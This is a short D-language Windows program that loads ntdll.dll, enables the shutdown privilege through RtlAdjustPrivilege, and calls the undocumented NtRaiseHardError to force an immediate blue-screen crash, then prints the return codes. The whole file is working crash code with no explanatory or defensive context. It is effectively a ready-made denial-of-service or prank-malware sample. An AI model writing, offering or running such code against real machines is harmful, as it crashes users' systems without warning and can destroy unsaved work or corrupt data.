import core.stdc.stdio;
import core.stdc.stdlib;
import core.sys.windows.windows;

int main()
{


    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    extern(Windows) int function(int, bool, bool, bool *) RtlAdjustPrivilege = 
        cast(int function(int, bool, bool, bool *)) GetProcAddress(ntdll, "RtlAdjustPrivilege");
    extern(Windows) int function(long, ulong, ulong, PULONG_PTR, ulong, ulong*) NtRaiseHardError = 
        cast(int function(long, ulong, ulong, PULONG_PTR, ulong, ulong*)) GetProcAddress(ntdll, "NtRaiseHardError");


    bool PrivilegeState = FALSE;
    ulong ErrorResponse = 0;

    int ret = RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);

    int ret2 = NtRaiseHardError(0xC0000006, 0, 0, NULL, 6, &ErrorResponse);
    
    printf("%d\n%d\n", ret, ret2);
    FreeLibrary(ntdll);
    return 0;
}
